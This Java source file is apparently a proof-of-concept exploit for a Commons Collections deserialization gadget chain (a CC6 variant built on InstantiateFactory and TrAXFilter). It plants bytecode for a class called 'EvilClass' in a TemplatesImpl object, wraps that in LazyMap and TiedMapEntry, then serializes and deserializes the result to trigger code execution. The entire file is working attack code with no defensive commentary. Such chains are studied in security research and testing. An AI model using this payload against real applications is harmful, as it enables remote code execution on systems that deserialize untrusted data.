import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.ObjectInputStream;
import java.util.HashMap;
import java.util.Map;

/*
    HashMap.readObject()
    HashMap.hash()
        TiedMapEntry.hashCode()
        TiedMapEntry.getValue()
            LazyMap.get()
                FactoryTransformer.transform()
                    InstantiateFactory.create()
                        TrAXFilter(Templates)
                            TemplatesImpl.newTransformer()
*/

public class InstantiateFactoryCC6 {
    public static void main(String[] args) throws Exception{
        byte[] bytes = Util.getExpClassFileBytes("EvilClass");

        TemplatesImpl templates = new TemplatesImpl();
        Util.setValue(templates, "_name", "a");
        Util.setValue(templates, "_bytecodes", bytes);

        FactoryTransformer factoryTransformer = new FactoryTransformer(new InstantiateFactory(
                TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates}
        ));

        HashMap innerMap = new HashMap();
        innerMap.put("foo", 123);

        Map outerMap = LazyMap.decorate(innerMap, factoryTransformer);

        TiedMapEntry entry = new TiedMapEntry(outerMap, "foo");

        HashMap expMap = new HashMap();

        expMap.put(entry, null);

        innerMap.clear();

        byte[] serial = Util.toSerial(expMap);

        ObjectInputStream in = Util.fromSerial(serial);

        in.readObject();
    }
}
